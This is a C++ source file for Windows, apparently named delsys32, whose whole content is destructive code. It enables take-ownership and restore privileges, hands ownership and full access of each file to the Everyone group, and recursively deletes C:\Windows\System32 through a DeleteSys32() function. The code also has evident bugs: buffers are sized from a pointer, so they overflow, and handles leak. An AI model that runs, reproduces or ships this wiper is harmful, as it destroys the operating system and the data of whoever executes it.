#include "delsys32.h"
#include "pch.h"

// This below function (SetPrivilege) is just taken from a Microsoft example online (https://learn.microsoft.com/en-us/windows/win32/secauthz/enabling-and-disabling-privileges-in-c--)
BOOL SetPrivilege(
    HANDLE hToken,          // access token handle
    LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
    BOOL bEnablePrivilege   // to enable or disable privilege
)
{
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(
        NULL,            // lookup privilege on local system
        lpszPrivilege,   // privilege to lookup 
        &luid))        // receives LUID of privilege
    {
        printf("LookupPrivilegeValue error: %u\n", GetLastError());
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    // Enable the privilege or disable all privileges.

    if (!AdjustTokenPrivileges(
        hToken,
        FALSE,
        &tp,
        sizeof(TOKEN_PRIVILEGES),
        (PTOKEN_PRIVILEGES)NULL,
        (PDWORD)NULL))
    {
        printf("AdjustTokenPrivileges error: %u\n", GetLastError());
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

    {
        printf("The token does not have the specified privilege. \n");
        return FALSE;
    }

    return TRUE;
}

// Take ownership of a file and delete it
void takeOwnAndDelete(wchar_t* file, bool directory) {
    // Take ownership
    // Get the current process token
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        printf("Failed to open token");
        return;
    }
    // Make it able to take ownership of stuff
    if (!SetPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME, TRUE)) {
        printf("Failed to give token ownership taking privileges");
        return;
    }
    if (!SetPrivilege(hToken, SE_RESTORE_NAME, TRUE)) {
        printf("Failed to give token ownership taking privileges");
        return;
    }
    // Get the Everyone group
    PSID pSIDEveryone = NULL;
    SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
    if (!AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pSIDEveryone)) {
        printf("Failed to get Everyone group");
        return;
    }
    // Give ownership of System32 to everyone
    DWORD test = SetNamedSecurityInfo(file, SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION, pSIDEveryone, NULL, NULL, NULL);
    if (test != ERROR_SUCCESS) {
        printf("Failed to take ownership");
        return;
    }
    // Change permissions on System32 to everyone has all perms
    EXPLICIT_ACCESS ea[1];
    ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
    ea[0].grfAccessMode = SET_ACCESS;
    ea[0].grfAccessPermissions = GENERIC_ALL;
    ea[0].grfInheritance = NO_INHERITANCE;
    ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
    ea[0].Trustee.TrusteeType = TRUSTEE_IS_GROUP;
    ea[0].Trustee.ptstrName = (LPTSTR)pSIDEveryone;
    PACL pACL = NULL;
    if (SetEntriesInAcl(1, ea, NULL, &pACL) != ERROR_SUCCESS) {
        printf("Failed to set pACL");
        return;
    }
    // Change the permissions
    if (SetNamedSecurityInfo(file, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL) != ERROR_SUCCESS) {
        printf("Failed to give everyone all access to sys32");
        return;
    }
    if (directory) {
        RemoveDirectory(file);
    }
    else {
        DeleteFile(file);
    }
}

void recursiveDelete(wchar_t* path) {
    wchar_t search[sizeof(path)];
    lstrcpy(search, path);
    lstrcat(search, L"\\*");
    WIN32_FIND_DATA subfile;
    HANDLE hFind = FindFirstFile(search, &subfile);
    do {
        if (lstrcmp(subfile.cFileName, L".") == 0 || lstrcmp(subfile.cFileName, L"..") == 0) {
            continue; // Skip . and ..
        }
        wchar_t filePath[sizeof(path) + sizeof(L"\\") + sizeof(subfile.cFileName)];
        lstrcpy(filePath, path);
        lstrcat(filePath, L"\\");
        lstrcat(filePath, subfile.cFileName);
        if (subfile.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // Is a folder; recursively delete it too
            recursiveDelete(filePath);
        }
        else {
            // Is a file; take ownership and remove
            takeOwnAndDelete(filePath, false);
        }
    } while (FindNextFile(hFind, &subfile));
    // Finally, try to delete the folder itself
    takeOwnAndDelete(path, true);
}

void DeleteSys32() {
    wchar_t System32[] = L"C:\\Windows\\System32";
    recursiveDelete(System32);
}